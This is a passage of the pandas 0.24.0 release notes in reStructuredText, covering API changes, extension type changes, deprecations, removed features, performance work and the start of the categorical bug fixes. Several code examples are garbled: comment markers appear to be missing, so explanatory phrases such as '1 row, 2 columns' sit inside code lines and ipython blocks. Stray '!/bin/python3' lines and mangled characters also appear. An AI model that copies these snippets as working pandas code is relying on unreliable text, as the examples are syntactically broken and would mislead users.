False\n   2  False  False\n   In [10]: df + (1, 2, 3)\n   ...\n   ValueError: Unable to coerce to Series, length must be 2: given 3\n\n*New behavior*:\n\n.. ipython:: python\n\n    Comparison operations and arithmetic operations both broadcast.\n   df == arr[[0], :]\n   df + arr[[0], :]\n\n.. ipython:: python\n\n    Comparison operations and arithmetic operations both broadcast.\n   df == (1, 2)\n   df + (1, 2)\n\n.. code-block:: ipython\n\n    Comparison operations and arithmetic operations both raise ValueError.\n   In [6]: df == (1, 2, 3)\n   ...\n   ValueError: Unable to coerce to Series, length must be 2: given 3\n\n   In [7]: df + (1, 2, 3)\n   ...\n   ValueError: Unable to coerce to Series, length must be 2: given 3\n\n.. _whatsnew_0240.api.dataframe_arithmetic_broadcasting:\n\nDataFrame arithmetic operations broadcasting changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`DataFrame` arithmetic operations when operating with 2-dimensional\n``np.ndarray`` objects now broadcast in the same way as ``np.ndarray``\nbroadcast.  (:issue:`23000`)\n\n.. ipython:: python\n\n   arr = np.arange(6).reshape(3, 2)\n   df = pd.DataFrame(arr)\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [5]: df + arr[[0], :]    1 row, 2 columns\n   ...\n   ValueError: Unable to coerce to DataFrame, shape must be (3, 2): given (1, 2)\n   In [6]: df + arr[:, [1]]    1 column, 3 rows\n   ...\n   ValueError: Unable to coerce to DataFrame, shape must be (3, 2): given (3, 1)\n\n*New behavior*:\n\n.. ipython:: python\n\n   df + arr[[0], :]    1 row, 2 columns\n   df + arr[:, [1]]    1 column, 3 rows\n\n.. _whatsnew_0240.api.incompatibilities:\n\nSeries and Index data-dtype incompatibilities\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Series`` and ``Index`` constructors now raise when the\ndata is incompatible with a passed ``dtype=`` (:issue:`15832`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [4]: pd.Series([-1], dtype=\"uint64\")\n    Out [4]:\n    0    18446744073709551615\n    dtype: uint64\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [4]: pd.Series([-1], dtype=\"uint64\")\n    Out [4]:\n    ...\n    OverflowError: Trying to coerce negative values to unsigned integers\n\n.. _whatsnew_0240.api.concat_categorical:\n\nConcatenation changes\n^^^^^^^^^^^^^^^^^^^^^\n\nCalling :func:`pandas.concat` on a ``Categorical`` of ints with NA values now\ncauses them to be processed as objects when concatenating with anything\nother than another ``Categorical`` of ints (:issue:`19214`)\n\n.. ipython:: python\n\n    s = pd.Series([0, 1, np.nan])\n    c = pd.Series([0, 1, np.nan], dtype=\"category\")\n\n*Previous behavior*\n\n.. code-block:: ipython\n\n    In [3]: pd.concat([s, c])\n    Out[3]:\n    0    0.0\n    1    1.0\n    2    NaN\n    0    0.0\n    1    1.0\n    2    NaN\n    dtype: float64\n\n*New behavior*\n\n.. ipython:: python\n\n    pd.concat([s, c])\n\nDatetimelike API changes\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- For :class:`DatetimeIndex` and :class:`TimedeltaIndex` with non-``None`` ``freq`` attribute, addition or subtraction of integer-dtyped array or ``Index`` will return an object of the same class (:issue:`19959`)\n- :class:`DateOffset` objects are now immutable. Attempting to alter one of these will now raise ``AttributeError`` (:issue:`21341`)\n- :class:`PeriodIndex` subtraction of another ``PeriodIndex`` will now return an object-dtype :class:`Index` of :class:`DateOffset` objects instead of raising a ``TypeError`` (:issue:`20049`)\n- :func:`cut` and :func:`qcut` now returns a :class:`DatetimeIndex` or :class:`TimedeltaIndex` bins when the input is datetime or timedelta dtype respectively and ``retbins=True`` (:issue:`19891`)\n- :meth:`DatetimeIndex.to_period` and :meth:`Timestamp.to_period` will issue a warning when timezone information will be lost (:issue:`21333`)\n- :meth:`PeriodIndex.tz_convert` and :meth:`PeriodIndex.tz_localize` have been removed (:issue:`21781`)\n\n.. _whatsnew_0240.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- A newly constructed empty :class:`DataFrame` with integer as the ``dtype`` will now only be cast to ``float64`` if ``index`` is specified (:issue:`22858`)\n- :meth:`Series.str.cat` will now raise if ``others`` is a ``set`` (:issue:`23009`)\n- Passing scalar values to :class:`DatetimeIndex` or :class:`TimedeltaIndex` will now raise ``TypeError`` instead of ``ValueError`` (:issue:`23539`)\n- ``max_rows`` and ``max_cols`` parameters removed from :class:`HTMLFormatter` since truncation is handled by :class:`DataFrameFormatter` (:issue:`23818`)\n- :func:`read_csv` will now raise a ``ValueError`` if a column with missing values is declared as having dtype ``bool`` (:issue:`20591`)\n- The column order of the resultant :class:`DataFrame` from :meth:`MultiIndex.to_frame` is now guaranteed to match the :attr:`MultiIndex.names` order. (:issue:`22420`)\n- Incorrectly passing a :class:`DatetimeIndex` to :meth:`MultiIndex.from_tuples`, rather than a sequence of tuples, now raises a ``TypeError`` rather than a ``ValueError`` (:issue:`24024`)\n- :func:`pd.offsets.generate_range` argument ``time_rule`` has been removed; use ``offset`` instead (:issue:`24157`)\n- In 0.23.x, pandas would raise a ``ValueError`` on a merge of a numeric column (e.g. ``int`` dtyped column) and an ``object`` dtyped column (:issue:`9780`). We have re-enabled the ability to merge ``object`` and other dtypes; pandas will still raise on a merge between a numeric and an ``object`` dtyped column that is composed only of strings (:issue:`21681`)\n- Accessing a level of a ``MultiIndex`` with a duplicate name (e.g. in\n  :meth:`~MultiIndex.get_level_values`) now raises a ``ValueError`` instead of a ``KeyError`` (:issue:`21678`).\n- Invalid construction of ``IntervalDtype`` will now always raise a ``TypeError`` rather than a ``ValueError`` if the subdtype is invalid (:issue:`21185`)\n- Trying to reindex a ``DataFrame`` with a non unique ``MultiIndex`` now raises a ``ValueError`` instead of an ``Exception`` (:issue:`21770`)\n- :class:`Index` subtraction will attempt to operate element-wise instead of raising ``TypeError`` (:issue:`19369`)\n- :class:`pandas.io.formats.style.Styler` supports a ``number-format`` property when using :meth:`~pandas.io.formats.style.Styler.to_excel` (:issue:`22015`)\n- :meth:`DataFrame.corr` and :meth:`Series.corr` now raise a ``ValueError`` along with a helpful error message instead of a ``KeyError`` when supplied with an invalid method (:issue:`22298`)\n- :meth:`shift` will now always return a copy, instead of the previous behaviour of returning self when shifting by 0 (:issue:`22397`)\n- :meth:`DataFrame.set_index` now gives a better (and less frequent) KeyError, raises a ``ValueError`` for incorrect types,\n  and will not fail on duplicate column names with ``drop=True``. (:issue:`22484`)\n- Slicing a single row of a DataFrame with multiple ExtensionArrays of the same type now preserves the dtype, rather than coercing to object (:issue:`22784`)\n- :class:`DateOffset` attribute ``_cacheable`` and method ``_should_cache`` have been removed (:issue:`23118`)\n- :meth:`Series.searchsorted`, when supplied a scalar value to search for, now returns a scalar instead of an array (:issue:`23801`).\n- :meth:`Categorical.searchsorted`, when supplied a scalar value to search for, now returns a scalar instead of an array (:issue:`23466`).\n- :meth:`Categorical.searchsorted` now raises a ``KeyError`` rather that a ``ValueError``, if a searched for key is not found in its categories (:issue:`23466`).\n- :meth:`Index.hasnans` and :meth:`Series.hasnans` now always return a python boolean. Previously, a python or a numpy boolean could be returned, depending on circumstances (:issue:`23294`).\n- The order of the arguments of :func:`DataFrame.to_html` and :func:`DataFrame.to_string` is rearranged to be consistent with each other. (:issue:`23614`)\n- :meth:`CategoricalIndex.reindex` now raises a ``ValueError`` if the target index is non-unique and not equal to the current index. It previously only raised if the target index was not of a categorical dtype (:issue:`23963`).\n- :func:`Series.to_list` and :func:`Index.to_list` are now aliases of ``Series.tolist`` respectively ``Index.tolist`` (:issue:`8826`)\n- The result of ``SparseSeries.unstack`` is now a :class:`DataFrame` with sparse values, rather than a :class:`SparseDataFrame` (:issue:`24372`).\n- :class:`DatetimeIndex` and :class:`TimedeltaIndex` no longer ignore the dtype precision. Passing a non-nanosecond resolution dtype will raise a ``ValueError`` (:issue:`24753`)\n\n\n.. _whatsnew_0240.api.extension:\n\nExtension type changes\n~~~~~~~~~~~~~~~~~~~~~~\n\n**Equality and hashability**\n\npandas now requires that extension dtypes be hashable (i.e. the respective\n``ExtensionDtype`` objects; hashability is not a requirement for the values\nof the corresponding ``ExtensionArray``). The base class implements\na default ``__eq__`` and ``__hash__``. If you have a parametrized dtype, you should\nupdate the ``ExtensionDtype._metadata`` tuple to match the signature of your\n``__init__`` method. See :class:`pandas.api.extensions.ExtensionDtype` for more (:issue:`22476`).\n\n**New and changed methods**\n\n- :meth:`~pandas.api.types.ExtensionArray.dropna` has been added (:issue:`21185`)\n- :meth:`~pandas.api.types.ExtensionArray.repeat` has been added (:issue:`24349`)\n- The ``ExtensionArray`` constructor, ``_from_sequence`` now take the keyword arg ``copy=False`` (:issue:`21185`)\n- :meth:`pandas.api.extensions.ExtensionArray.shift` added as part of the basic ``ExtensionArray`` interface (:issue:`22387`).\n- :meth:`~pandas.api.types.ExtensionArray.searchsorted` has been added (:issue:`24350`)\n- Support for reduction operations such as ``sum``, ``mean`` via opt-in base class method override (:issue:`22762`)\n- :func:`ExtensionArray.isna` is allowed to return an ``ExtensionArray`` (:issue:`22325`).\n\n**Dtype changes**\n\n- ``ExtensionDtype`` has gained the ability to instantiate from string dtypes, e.g. ``decimal`` would instantiate a registered ``DecimalDtype``; furthermore\n  the ``ExtensionDtype`` has gained the method ``construct_array_type`` (:issue:`21185`)\n- Added ``ExtensionDtype._is_numeric`` for controlling whether an extension dtype is considered numeric (:issue:`22290`).\n- Added :meth:`pandas.api.types.register_extension_dtype` to register an extension type with pandas (:issue:`22664`)\n- Updated the ``.type`` attribute for ``PeriodDtype``, ``DatetimeTZDtype``, and ``IntervalDtype`` to be instances of the dtype (``Period``, ``Timestamp``, and ``Interval`` respectively) (:issue:`22938`)\n\n.. _whatsnew_0240.enhancements.extension_array_operators:\n\n**Operator support**\n\nA ``Series`` based on an ``ExtensionArray`` now supports arithmetic and comparison\noperators (:issue:`19577`). There are two approaches for providing operator support for an ``ExtensionArray``:\n\n1. Define each of the operators on your ``ExtensionArray`` subclass.\n2. Use an operator implementation from pandas that depends on operators that are already defined\n   on the underlying elements (scalars) of the ``ExtensionArray``.\n\nSee the :ref:`ExtensionArray Operator Support\n<extending.extension.operator>` documentation section for details on both\nways of adding operator support.\n\n**Other changes**\n\n- A default repr for :class:`pandas.api.extensions.ExtensionArray` is now provided (:issue:`23601`).\n- :meth:`ExtensionArray._formatting_values` is deprecated. Use :attr:`ExtensionArray._formatter` instead. (:issue:`23601`)\n- An ``ExtensionArray`` with a boolean dtype now works correctly as a boolean indexer. :meth:`pandas.api.types.is_bool_dtype` now properly considers them boolean (:issue:`22326`)\n\n**Bug fixes**\n\n- Bug in :meth:`Series.get` for ``Series`` using ``ExtensionArray`` and integer index (:issue:`21257`)\n- :meth:`~Series.shift` now dispatches to :meth:`ExtensionArray.shift` (:issue:`22386`)\n- :meth:`Series.combine()` works correctly with :class:`~pandas.api.extensions.ExtensionArray` inside of :class:`Series` (:issue:`20825`)\n- :meth:`Series.combine()` with scalar argument now works for any function type (:issue:`21248`)\n- :meth:`Series.astype` and :meth:`DataFrame.astype` now dispatch to :meth:`ExtensionArray.astype` (:issue:`21185`).\n- Slicing a single row of a ``DataFrame`` with multiple ExtensionArrays of the same type now preserves the dtype, rather than coercing to object (:issue:`22784`)\n- Bug when concatenating multiple ``Series`` with different extension dtypes not casting to object dtype (:issue:`22994`)\n- Series backed by an ``ExtensionArray`` now work with :func:`util.hash_pandas_object` (:issue:`23066`)\n- :meth:`DataFrame.stack` no longer converts to object dtype for DataFrames where each column has the same extension dtype. The output Series will have the same dtype as the columns (:issue:`23077`).\n- :meth:`Series.unstack` and :meth:`DataFrame.unstack` no longer convert extension arrays to object-dtype ndarrays. Each column in the output ``DataFrame`` will now have the same dtype as the input (:issue:`23077`).\n- Bug when grouping :meth:`Dataframe.groupby()` and aggregating on ``ExtensionArray`` it was not returning the actual ``ExtensionArray`` dtype (:issue:`23227`).\n- Bug in :func:`pandas.merge` when merging on an extension array-backed column (:issue:`23020`).\n\n\n.. _whatsnew_0240.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- :attr:`MultiIndex.labels` has been deprecated and replaced by :attr:`MultiIndex.codes`.\n  The functionality is unchanged. The new name better reflects the natures of\n  these codes and makes the ``MultiIndex`` API more similar to the API for :class:`CategoricalIndex` (:issue:`13443`).\n  As a consequence, other uses of the name ``labels`` in ``MultiIndex`` have also been deprecated and replaced with ``codes``:\n\n  - You should initialize a ``MultiIndex`` instance using a parameter named ``codes`` rather than ``labels``.\n  - ``MultiIndex.set_labels`` has been deprecated in favor of :meth:`MultiIndex.set_codes`.\n  - For method :meth:`MultiIndex.copy`, the ``labels`` parameter has been deprecated and replaced by a ``codes`` parameter.\n- :meth:`DataFrame.to_stata`, :meth:`read_stata`, :class:`StataReader` and :class:`StataWriter` have deprecated the ``encoding`` argument. The encoding of a Stata dta file is determined by the file type and cannot be changed (:issue:`21244`)\n- :meth:`MultiIndex.to_hierarchical` is deprecated and will be removed in a future version (:issue:`21613`)\n- :meth:`Series.ptp` is deprecated. Use ``numpy.ptp`` instead (:issue:`21614`)\n- :meth:`Series.compress` is deprecated. Use ``Series[condition]`` instead (:issue:`18262`)\n- The signature of :meth:`Series.to_csv` has been uniformed to that of :meth:`DataFrame.to_csv`: the name of the first argument is now ``path_or_buf``, the order of subsequent arguments has changed, the ``header`` argument now defaults to ``True``. (:issue:`19715`)\n- :meth:`Categorical.from_codes` has deprecated providing float values for the ``codes`` argument. (:issue:`21767`)\n- :func:`pandas.read_table` is deprecated. Instead, use :func:`read_csv` passing ``sep='\\t'`` if necessary. This deprecation has been removed in 0.25.0. (:issue:`21948`)\n- :meth:`Series.str.cat` has deprecated using arbitrary list-likes *within* list-likes. A list-like container may still contain\n  many ``Series``, ``Index`` or 1-dimensional ``np.ndarray``, or alternatively, only scalar values. (:issue:`21950`)\n- :meth:`FrozenNDArray.searchsorted` has deprecated the ``v`` parameter in favor of ``value`` (:issue:`14645`)\n- :func:`DatetimeIndex.shift` and :func:`PeriodIndex.shift` now accept ``periods`` argument instead of ``n`` for consistency with :func:`Index.shift` and :func:`Series.shift`. Using ``n`` throws a deprecation warning (:issue:`22458`, :issue:`22912`)\n- The ``fastpath`` keyword of the different Index constructors is deprecated (:issue:`23110`).\n- :meth:`Timestamp.tz_localize`, :meth:`DatetimeIndex.tz_localize`, and :meth:`Series.tz_localize` have deprecated the ``errors`` argument in favor of the ``nonexistent`` argument (:issue:`8917`)\n- The class ``FrozenNDArray`` has been deprecated. When unpickling, ``FrozenNDArray`` will be unpickled to ``np.ndarray`` once this class is removed (:issue:`9031`)\n- The methods :meth:`DataFrame.update` and :meth:`Panel.update` have deprecated the ``raise_conflict=False|True`` keyword in favor of ``errors='ignore'|'raise'`` (:issue:`23585`)\n- The methods :meth:`Series.str.partition` and :meth:`Series.str.rpartition` have deprecated the ``pat`` keyword in favor of ``sep`` (:issue:`22676`)\n- Deprecated the ``nthreads`` keyword of :func:`pandas.read_feather` in favor of ``use_threads`` to reflect the changes in ``pyarrow>=0.11.0``. (:issue:`23053`)\n- :func:`pandas.read_excel` has deprecated accepting ``usecols`` as an integer. Please pass in a list of ints from 0 to ``usecols`` inclusive instead (:issue:`23527`)\n- Constructing a :class:`TimedeltaIndex` from data with ``datetime64``-dtyped data is deprecated, will raise ``TypeError`` in a future version (:issue:`23539`)\n- Constructing a :class:`DatetimeIndex` from data with ``timedelta64``-dtyped data is deprecated, will raise ``TypeError`` in a future version (:issue:`23675`)\n- The ``keep_tz=False`` option (the default) of the ``keep_tz`` keyword of\n  :meth:`DatetimeIndex.to_series` is deprecated (:issue:`17832`).\n- Timezone converting a tz-aware ``datetime.datetime`` or :class:`Timestamp` with :class:`Timestamp` and the ``tz`` argument is now deprecated. Instead, use :meth:`Timestamp.tz_convert` (:issue:`23579`)\n- :func:`pandas.api.types.is_period` is deprecated in favor of ``pandas.api.types.is_period_dtype`` (:issue:`23917`)\n- :func:`pandas.api.types.is_datetimetz` is deprecated in favor of ``pandas.api.types.is_datetime64tz`` (:issue:`23917`)\n- Creating a :class:`TimedeltaIndex`, :class:`DatetimeIndex`, or :class:`PeriodIndex` by passing range arguments ``start``, ``end``, and ``periods`` is deprecated in favor of :func:`timedelta_range`, :func:`date_range`, or :func:`period_range` (:issue:`23919`)\n- Passing a string alias like ``'datetime64[ns, UTC]'`` as the ``unit`` parameter to :class:`DatetimeTZDtype` is deprecated. Use :class:`DatetimeTZDtype.construct_from_string` instead (:issue:`23990`).\n- The ``skipna`` parameter of :meth:`~pandas.api.types.infer_dtype` will switch to ``True`` by default in a future version of pandas (:issue:`17066`, :issue:`24050`)\n- In :meth:`Series.where` with Categorical data, providing an ``other`` that is not present in the categories is deprecated. Convert the categorical to a different dtype or add the ``other`` to the categories first (:issue:`24077`).\n- :meth:`Series.clip_lower`, :meth:`Series.clip_upper`, :meth:`DataFrame.clip_lower` and :meth:`DataFrame.clip_upper` are deprecated and will be removed in a future version. Use ``Series.clip(lower=threshold)``, ``Series.clip(upper=threshold)`` and the equivalent ``DataFrame`` methods (:issue:`24203`)\n- :meth:`Series.nonzero` is deprecated and will be removed in a future version (:issue:`18262`)\n- Passing an integer to :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtypes is deprecated, will raise ``TypeError`` in a future version.  Use ``obj.fillna(pd.Timedelta(...))`` instead (:issue:`24694`)\n- ``Series.cat.categorical``, ``Series.cat.name`` and ``Series.cat.index`` have been deprecated. Use the attributes on ``Series.cat`` or ``Series`` directly. (:issue:`24751`).\n- Passing a dtype without a precision like ``np.dtype('datetime64')`` or ``timedelta64`` to :class:`Index`, :class:`DatetimeIndex` and :class:`TimedeltaIndex` is now deprecated. Use the nanosecond-precision dtype instead (:issue:`24753`).\n\n.. _whatsnew_0240.deprecations.datetimelike_int_ops:\n\nInteger addition/subtraction with datetimes and timedeltas is deprecated\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn the past, users could\u00e2\u0080\u0094in some cases\u00e2\u0080\u0094add or subtract integers or integer-dtype\narrays from :class:`Timestamp`, :class:`DatetimeIndex` and :class:`TimedeltaIndex`.\n\nThis usage is now deprecated.  Instead add or subtract integer multiples of\nthe object's ``freq`` attribute (:issue:`21939`, :issue:`23878`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: ts = pd.Timestamp('1994-05-06 12:15:16', freq=pd.offsets.Hour())\n    In [6]: ts + 2\n    Out[6]: Timestamp('1994-05-06 14:15:16', freq='H')\n\n    In [7]: tdi = pd.timedelta_range('1D', periods=2)\n    In [8]: tdi - np.array([2, 1])\n    Out[8]: TimedeltaIndex(['-1 days', '1 days'], dtype='timedelta64[ns]', freq=None)\n\n    In [9]: dti = pd.date_range('2001-01-01', periods=2, freq='7D')\n    In [10]: dti + pd.Index([1, 2])\n    Out[10]: DatetimeIndex(['2001-01-08', '2001-01-22'], dtype='datetime64[ns]', freq=None)\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [108]: ts = pd.Timestamp('1994-05-06 12:15:16', freq=pd.offsets.Hour())\n\n    In[109]: ts + 2 * ts.freq\n    Out[109]: Timestamp('1994-05-06 14:15:16', freq='H')\n\n    In [110]: tdi = pd.timedelta_range('1D', periods=2)\n\n    In [111]: tdi - np.array([2 * tdi.freq, 1 * tdi.freq])\n    Out[111]: TimedeltaIndex(['-1 days', '1 days'], dtype='timedelta64[ns]', freq=None)\n\n    In [112]: dti = pd.date_range('2001-01-01', periods=2, freq='7D')\n\n    In [113]: dti + pd.Index([1 * dti.freq, 2 * dti.freq])\n    Out[113]: DatetimeIndex(['2001-01-08', '2001-01-22'], dtype='datetime64[ns]', freq=None)\n\n\n.. _whatsnew_0240.deprecations.integer_tz:\n\nPassing integer data and a timezone to DatetimeIndex\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe behavior of :class:`DatetimeIndex` when passed integer data and\na timezone is changing in a future version of pandas. Previously, these\nwere interpreted as wall times in the desired timezone. In the future,\nthese will be interpreted as wall times in UTC, which are then converted\nto the desired timezone (:issue:`24559`).\n\nThe default behavior remains the same, but issues a warning:\n\n.. code-block:: ipython\n\n   In [3]: pd.DatetimeIndex([946684800000000000], tz=\"US/Central\")\n   /bin/ipython:1: FutureWarning:\n       Passing integer-dtype data and a timezone to DatetimeIndex. Integer values\n       will be interpreted differently in a future version of pandas. Previously,\n       these were viewed as datetime64[ns] values representing the wall time\n       *in the specified timezone*. In the future, these will be viewed as\n       datetime64[ns] values representing the wall time *in UTC*. This is similar\n       to a nanosecond-precision UNIX epoch. To accept the future behavior, use\n\n           pd.to_datetime(integer_data, utc=True).tz_convert(tz)\n\n       To keep the previous behavior, use\n\n           pd.to_datetime(integer_data).tz_localize(tz)\n\n    !/bin/python3\n    Out[3]: DatetimeIndex(['2000-01-01 00:00:00-06:00'], dtype='datetime64[ns, US/Central]', freq=None)\n\nAs the warning message explains, opt in to the future behavior by specifying that\nthe integer values are UTC, and then converting to the final timezone:\n\n.. ipython:: python\n\n   pd.to_datetime([946684800000000000], utc=True).tz_convert('US/Central')\n\nThe old behavior can be retained with by localizing directly to the final timezone:\n\n.. ipython:: python\n\n   pd.to_datetime([946684800000000000]).tz_localize('US/Central')\n\n.. _whatsnew_0240.deprecations.tz_aware_array:\n\nConverting timezone-aware Series and Index to NumPy arrays\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe conversion from a :class:`Series` or :class:`Index` with timezone-aware\ndatetime data will change to preserve timezones by default (:issue:`23569`).\n\nNumPy doesn't have a dedicated dtype for timezone-aware datetimes.\nIn the past, converting a :class:`Series` or :class:`DatetimeIndex` with\ntimezone-aware datatimes would convert to a NumPy array by\n\n1. converting the tz-aware data to UTC\n2. dropping the timezone-info\n3. returning a :class:`numpy.ndarray` with ``datetime64[ns]`` dtype\n\nFuture versions of pandas will preserve the timezone information by returning an\nobject-dtype NumPy array where each value is a :class:`Timestamp` with the correct\ntimezone attached\n\n.. ipython:: python\n\n   ser = pd.Series(pd.date_range('2000', periods=2, tz=\"CET\"))\n   ser\n\nThe default behavior remains the same, but issues a warning\n\n.. code-block:: python\n\n   In [8]: np.asarray(ser)\n   /bin/ipython:1: FutureWarning: Converting timezone-aware DatetimeArray to timezone-naive\n         ndarray with 'datetime64[ns]' dtype. In the future, this will return an ndarray\n         with 'object' dtype where each element is a 'pandas.Timestamp' with the correct 'tz'.\n\n           To accept the future behavior, pass 'dtype=object'.\n           To keep the old behavior, pass 'dtype=\"datetime64[ns]\"'.\n     !/bin/python3\n   Out[8]:\n   array(['1999-12-31T23:00:00.000000000', '2000-01-01T23:00:00.000000000'],\n         dtype='datetime64[ns]')\n\nThe previous or future behavior can be obtained, without any warnings, by specifying\nthe ``dtype``\n\n*Previous behavior*\n\n.. ipython:: python\n\n   np.asarray(ser, dtype='datetime64[ns]')\n\n*Future behavior*\n\n.. ipython:: python\n\n    New behavior\n   np.asarray(ser, dtype=object)\n\n\nOr by using :meth:`Series.to_numpy`\n\n.. ipython:: python\n\n   ser.to_numpy()\n   ser.to_numpy(dtype=\"datetime64[ns]\")\n\nAll the above applies to a :class:`DatetimeIndex` with tz-aware values as well.\n\n.. _whatsnew_0240.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- The ``LongPanel`` and ``WidePanel`` classes have been removed (:issue:`10892`)\n- :meth:`Series.repeat` has renamed the ``reps`` argument to ``repeats`` (:issue:`14645`)\n- Several private functions were removed from the (non-public) module ``pandas.core.common`` (:issue:`22001`)\n- Removal of the previously deprecated module ``pandas.core.datetools`` (:issue:`14105`, :issue:`14094`)\n- Strings passed into :meth:`DataFrame.groupby` that refer to both column and index levels will raise a ``ValueError`` (:issue:`14432`)\n- :meth:`Index.repeat` and :meth:`MultiIndex.repeat` have renamed the ``n`` argument to ``repeats`` (:issue:`14645`)\n- The ``Series`` constructor and ``.astype`` method will now raise a ``ValueError`` if timestamp dtypes are passed in without a unit (e.g. ``np.datetime64``) for the ``dtype`` parameter (:issue:`15987`)\n- Removal of the previously deprecated ``as_indexer`` keyword completely from ``str.match()`` (:issue:`22356`, :issue:`6581`)\n- The modules ``pandas.types``, ``pandas.computation``, and ``pandas.util.decorators`` have been removed (:issue:`16157`, :issue:`16250`)\n- Removed the ``pandas.formats.style`` shim for :class:`pandas.io.formats.style.Styler` (:issue:`16059`)\n- ``pandas.pnow``, ``pandas.match``, ``pandas.groupby``, ``pd.get_store``, ``pd.Expr``, and ``pd.Term`` have been removed (:issue:`15538`, :issue:`15940`)\n- :meth:`Categorical.searchsorted` and :meth:`Series.searchsorted` have renamed the ``v`` argument to ``value`` (:issue:`14645`)\n- ``pandas.parser``, ``pandas.lib``, and ``pandas.tslib`` have been removed (:issue:`15537`)\n- :meth:`Index.searchsorted` have renamed the ``key`` argument to ``value`` (:issue:`14645`)\n- ``DataFrame.consolidate`` and ``Series.consolidate`` have been removed (:issue:`15501`)\n- Removal of the previously deprecated module ``pandas.json`` (:issue:`19944`)\n- The module ``pandas.tools`` has been removed (:issue:`15358`, :issue:`16005`)\n- :meth:`SparseArray.get_values` and :meth:`SparseArray.to_dense` have dropped the ``fill`` parameter (:issue:`14686`)\n- ``DataFrame.sortlevel`` and ``Series.sortlevel`` have been removed (:issue:`15099`)\n- :meth:`SparseSeries.to_dense` has dropped the ``sparse_only`` parameter (:issue:`14686`)\n- :meth:`DataFrame.astype` and :meth:`Series.astype` have renamed the ``raise_on_error`` argument to ``errors`` (:issue:`14967`)\n- ``is_sequence``, ``is_any_int_dtype``, and ``is_floating_dtype`` have been removed from ``pandas.api.types`` (:issue:`16163`, :issue:`16189`)\n\n.. _whatsnew_0240.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Slicing Series and DataFrames with an monotonically increasing :class:`CategoricalIndex`\n  is now very fast and has speed comparable to slicing with an ``Int64Index``.\n  The speed increase is both when indexing by label (using .loc) and position(.iloc) (:issue:`20395`)\n  Slicing a monotonically increasing :class:`CategoricalIndex` itself (i.e. ``ci[1000:2000]``)\n  shows similar speed improvements as above (:issue:`21659`)\n- Improved performance of :meth:`CategoricalIndex.equals` when comparing to another :class:`CategoricalIndex` (:issue:`24023`)\n- Improved performance of :func:`Series.describe` in case of numeric dtpyes (:issue:`21274`)\n- Improved performance of :func:`.GroupBy.rank` when dealing with tied rankings (:issue:`21237`)\n- Improved performance of :func:`DataFrame.set_index` with columns consisting of :class:`Period` objects (:issue:`21582`, :issue:`21606`)\n- Improved performance of :meth:`Series.at` and :meth:`Index.get_value` for Extension Arrays values (e.g. :class:`Categorical`) (:issue:`24204`)\n- Improved performance of membership checks in :class:`Categorical` and :class:`CategoricalIndex`\n  (i.e. ``x in cat``-style checks are much faster). :meth:`CategoricalIndex.contains`\n  is likewise much faster (:issue:`21369`, :issue:`21508`)\n- Improved performance of :meth:`HDFStore.groups` (and dependent functions like\n  :meth:`HDFStore.keys`.  (i.e. ``x in store`` checks are much faster)\n  (:issue:`21372`)\n- Improved the performance of :func:`pandas.get_dummies` with ``sparse=True`` (:issue:`21997`)\n- Improved performance of :func:`IndexEngine.get_indexer_non_unique` for sorted, non-unique indexes (:issue:`9466`)\n- Improved performance of :func:`PeriodIndex.unique` (:issue:`23083`)\n- Improved performance of :func:`concat` for ``Series`` objects (:issue:`23404`)\n- Improved performance of :meth:`DatetimeIndex.normalize` and :meth:`Timestamp.normalize` for timezone naive or UTC datetimes (:issue:`23634`)\n- Improved performance of :meth:`DatetimeIndex.tz_localize` and various ``DatetimeIndex`` attributes with dateutil UTC timezone (:issue:`23772`)\n- Fixed a performance regression on Windows with Python 3.7 of :func:`read_csv` (:issue:`23516`)\n- Improved performance of :class:`Categorical` constructor for ``Series`` objects (:issue:`23814`)\n- Improved performance of :meth:`~DataFrame.where` for Categorical data (:issue:`24077`)\n- Improved performance of iterating over a :class:`Series`. Using :meth:`DataFrame.itertuples` now creates iterators\n  without internally allocating lists of all elements (:issue:`20783`)\n- Improved performance of :class:`Period` constructor, additionally benefitting ``PeriodArray`` and ``PeriodIndex`` creation (:issue:`24084`, :issue:`24118`)\n- Improved performance of tz-aware :class:`DatetimeArray` binary operations (:issue:`24491`)\n\n.. _whatsnew_0240.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n\n- Bug in :meth:`Categorical.from_codes` where ``NaN`` values in ``codes`` were silently converted to ``0`` (:issue:`21767`). In the future this will raise a ``ValueError``. Also changes the behavior of ``.from_codes([1.1, 2.0])``.\n- Bug in :meth:`Categorical.sort_values` where ``NaN`` values were always positioned in front regardless of ``na_position`` value. (:issue:`22556`).\n- Bug when indexing with a boolean-valued ``Categorical``. Now a boolean-valued ``Categorical`` is treated as a boolean mask (:issue:`22665`)\n- Constructing a :class:`CategoricalIndex` with empty values and boolean categories was raising a ``ValueError`` after a change to dtype coercion (:issue:`22702`).\n- Bug in :meth:`Categorical.take` with a user-provided ``fill_value`` not encoding the ``fill_value``, which could result in a ``ValueError``, incorrect results, or a segmentation fault (:issue:`23296`).\n- In :meth:`Series.unstack`, specifying a ``fill_value`` not present in the categories now raises a ``TypeError`` rather than ignoring the ``fill_value`` (:issue:`23284`)\n- Bug when resampling :meth:`DataFrame.resample()` and aggregating on categorical data, the categorical dtype was getting lost. 